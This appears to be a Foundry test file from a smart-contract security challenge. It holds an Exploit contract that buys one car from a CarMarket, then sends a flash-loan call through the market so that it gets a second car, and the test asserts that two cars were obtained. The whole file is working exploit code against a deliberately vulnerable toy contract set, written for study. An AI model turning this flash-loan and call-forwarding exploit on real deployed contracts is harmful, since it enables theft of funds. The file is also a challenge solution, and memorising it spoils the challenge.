// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../Cars/CarToken.sol";
import "../Cars/CarFactory.sol";
import "../Cars/CarMarket.sol";

contract Exploit {
    CarToken token;
    CarFactory factory;
    CarMarket market;

    constructor(CarToken _tokenAddr, CarFactory _factoryAddr, CarMarket _marketAddr) {
        token = _tokenAddr;
        factory = _factoryAddr;
        market = _marketAddr;
    }
    
    function start() public {
        bytes memory flashLoan_func_sign = abi.encodeWithSelector(factory.flashLoan.selector, 100_000 ether, address(this));

        token.mint();
        token.approve(address(market), type(uint256).max);
        market.purchaseCar("TESLA", "Black", "TEST123");
        address(market).call(flashLoan_func_sign);
        market.purchaseCar("DMC-12", "Silver", "OUTATIME");
    }
    
    function receivedCarToken(address _factoryAddr) public returns(bool) {
        return true;
    }

}

contract ContractTest is Test {
    CarToken token;
    CarFactory factory;
    CarMarket market;
    Exploit exploit;
    address public attacker;

    function setUp() public {

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);
        
        token = new CarToken();
        market = new CarMarket(address(token));
        factory = new CarFactory(address(market), address(token));

        token.priviledgedMint(address(factory), 100000 ether);
        token.priviledgedMint(address(market), 100000 ether);

        market.setCarFactory(address(factory));

        vm.label(address(token), "CarToken");
        vm.label(address(market), "CarMarket");
        vm.label(address(factory), "CarFactory");
    }
    
    function testExploit() public {
        vm.startPrank(attacker);
        exploit = new Exploit(token, factory, market);
        exploit.start();
        vm.stopPrank();
		verify();
    }

    function verify() public {
        assertEq(market.getCarCount(address(exploit)), 2);
    }
}
